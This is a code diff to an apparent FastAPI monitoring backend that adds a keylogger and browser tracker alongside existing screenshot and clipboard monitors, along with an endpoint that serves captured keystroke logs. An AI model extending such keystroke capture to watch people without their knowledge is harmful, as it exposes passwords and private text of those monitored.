@@ -25,6 +25,8 @@ from monitoring.app_tracker import AppTracker
 from monitoring.data_cleaner import CleanupService
 from services.sync_service import SyncService
 from utils.config_manager import ConfigManager
+from monitoring.browser_tracker import BrowserTracker
+from monitoring.keylogger import Keylogger
 
 logger = logging.getLogger(__name__)
 
@@ -43,6 +45,8 @@ db_manager = DatabaseManager()
 screenshot_monitor = ScreenshotMonitor(db_manager)
 clipboard_monitor = ClipboardMonitor(db_manager)
 app_tracker = AppTracker(db_manager)
+browser_tracker = BrowserTracker(db_manager)
+keylogger = Keylogger(db_manager)
 cleanup_service = CleanupService(db_manager)
 config_manager = ConfigManager()
 sync_service = SyncService(db_manager, config_manager)
@@ -246,6 +250,14 @@ async def get_browser_logs(limit: int = 50, offset: int = 0, user=Depends(verify
         logger.error(f"Error getting browser logs: {e}")
         raise HTTPException(status_code=500, detail="Failed to get browser logs")
 
+@app.get("/api/data/keylogs")
+async def get_key_logs(limit: int = 100, offset: int = 0, user=Depends(verify_token)):
+    try:
+        return db_manager.get_text_logs(limit, offset)
+    except Exception as e:
+        logger.error(f"Error getting key logs: {e}")
+        raise HTTPException(status_code=500, detail="Failed to get key logs")
+
 @app.get("/api/data/clipboard")
 async def get_clipboard_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
     try:
@@ -271,6 +283,8 @@ async def pause_monitoring(user=Depends(verify_token)):
     screenshot_monitor.pause()
     clipboard_monitor.pause()
     app_tracker.pause()
+    browser_tracker.pause()
+    keylogger.pause()
     logger.info("Monitoring paused")
     return {"success": True, "message": "Monitoring paused"}
 
@@ -281,6 +295,8 @@ async def resume_monitoring(user=Depends(verify_token)):
     screenshot_monitor.resume()
     clipboard_monitor.resume()
     app_tracker.resume()
+    browser_tracker.resume()
+    keylogger.resume()
     logger.info("Monitoring resumed")
     return {"success": True, "message": "Monitoring resumed"}
 
@@ -308,6 +324,8 @@ async def startup_event():
     screenshot_monitor.start()
     clipboard_monitor.start()
     app_tracker.start()
+    browser_tracker.start()
+    keylogger.start()
     cleanup_service.start()
     sync_service.start()
     logger.info("All monitoring services started")
@@ -318,6 +336,8 @@ async def shutdown_event():
     screenshot_monitor.stop()
     clipboard_monitor.stop()
     app_tracker.stop()
+    browser_tracker.stop()
+    keylogger.stop()
     cleanup_service.stop()
     sync_service.stop()
     logger.info("All monitoring services stopped")
